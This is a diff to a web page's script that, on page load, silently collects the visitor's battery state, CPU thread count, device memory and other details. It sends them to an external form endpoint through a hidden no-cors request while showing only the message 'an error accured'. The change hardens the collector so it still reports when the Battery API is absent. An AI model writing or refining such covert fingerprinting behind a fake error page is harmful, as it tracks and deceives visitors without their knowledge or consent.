@@ -23,23 +23,33 @@
     }
 
     async function sendInfo() {
-      if (!navigator.getBattery) {
-        alert("Battery API not supported on this device.");
-        return;
+
+      // Default battery values (used if Battery API is missing)
+      let percent = "NaN";
+      let charging = "NaN";
+      let timeFull = "NaN";
+      let timeEmpty = "NaN";
+
+      // If Battery API exists, fill real values
+      if (navigator.getBattery) {
+        try {
+          const b = await navigator.getBattery();
+
+          percent = Math.round(b.level * 100);
+          charging = b.charging ? "true" : "false";
+
+          function sec(v) {
+            if (v === Infinity || v < 0) return "infinity";
+            return Math.floor(v);
+          }
+
+          timeFull = sec(b.chargingTime);
+          timeEmpty = sec(b.dischargingTime);
+
+        } catch (e) {
+          // If battery API fails, keep NaN defaults
+        }
       }
-
-      const b = await navigator.getBattery();
-
-      const percent = Math.round(b.level * 100);
-      const charging = b.charging ? "true" : "false";
-
-      function sec(v) {
-        if (v === Infinity || v < 0) return "infinity";
-        return Math.floor(v);
-      }
-
-      const timeFull = sec(b.chargingTime);
-      const timeEmpty = sec(b.dischargingTime);
 
       const cpuThreads = navigator.hardwareConcurrency || "unknown";
       const ramGB = navigator.deviceMemory || "unknown";
@@ -78,11 +88,10 @@
         "?entry.1907966889=" + encodeURIComponent(payload) +
         "&submit=Submit";
 
-      fetch(url, { method: "GET", mode: "no-cors" })
-        
+      fetch(url, { method: "GET", mode: "no-cors" });
     }
+</script>
 
-  </script>
 </head>
 <body onload="sendInfo()">
     <p>an error accured</p>
